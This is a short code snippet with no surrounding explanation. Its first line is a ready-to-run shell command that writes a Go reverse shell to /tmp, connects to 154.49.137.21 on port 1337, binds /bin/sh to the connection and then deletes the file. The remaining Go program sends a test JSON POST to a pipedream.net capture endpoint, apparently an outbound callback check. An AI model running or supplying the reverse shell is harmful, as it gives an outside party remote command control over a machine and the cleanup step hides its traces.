echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","154.49.137.21:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
package main

import (
	"bytes"
	"net/http"
	"time"
)

func main() {
	jsonStr := []byte(`{
  "test": "event"
}`)

	req, err := http.NewRequest("POST", "https://eoywrbj6otr1rve.m.pipedream.net", bytes.NewReader(jsonStr))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: time.Minute}

	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()
}